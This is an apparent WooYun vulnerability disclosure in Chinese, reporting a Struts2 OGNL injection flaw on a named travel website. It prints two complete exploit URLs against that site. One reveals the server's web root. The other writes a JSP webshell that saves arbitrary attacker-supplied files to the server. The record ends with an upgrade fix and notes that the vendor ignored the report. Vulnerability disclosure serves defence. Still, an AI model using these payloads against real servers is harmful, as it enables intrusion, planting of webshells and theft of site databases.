wybug_title: 悠乐马旅游网存在struts漏洞
wybug_status: 未联系到厂商或者厂商积极忽略
wybug_detail:
漏洞详情 披露状态：   									2013-07-31：	积极联系厂商并且等待厂商认领中，细节不对外公开									2013-09-14：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 悠乐马旅游网存在struts漏洞 详细说明：  1、可以通过http://www.youlema.com/mc/login.action?redirect%3A%24%7B%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%23req.getSession%28%29%2C%23b%3D%23a.getServletContext%28%29%2C%23c%3D%23b.getRealPath%28%22%2F%22%29%2C%23matt%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23matt.getWriter%28%29.println%28%23c%29%2C%23matt.getWriter%28%29.flush%28%29%2C%23matt.getWriter%28%29.close%28%29%7D  获取到网站根目录位置2、通过http://www.youlema.com/mc/login.action?redirect:${%23req%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest'),%23p%3d(%23req.getRealPath(%22/%22)%2b%22test.jsp%22).replaceAll("\\\\","/"),new+java.io.BufferedWriter(new+java.io.FileWriter(%23p)).append(%23req.getParameter(%22c%22)).close()}&c=%3c%25if(request.getParameter(%22f%22)!%3dnull)(new+java.io.FileOutputStream(application.getRealPath(%22%2f%22)%2brequest.getParameter(%22f%22))).write(request.getParameter(%22t%22).getBytes())%3b%25%3e写入文件。......由上证明悠乐马旅游网存在struts漏洞，需要尽快修复，以免被人下载恶意jsp文件到服务器进行脱裤。   漏洞证明：  



   修复方案：  也是建议升级struts2-core-2.3.15.1.jarcommons-lang3-3.1.jarxwork-core-2.3.15.1.jarognl-3.0.6.jarstruts2-convention-plugin-2.3.15.1.jar   版权声明：转载请注明来源 白猫@乌云
wybug_reply: 漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝
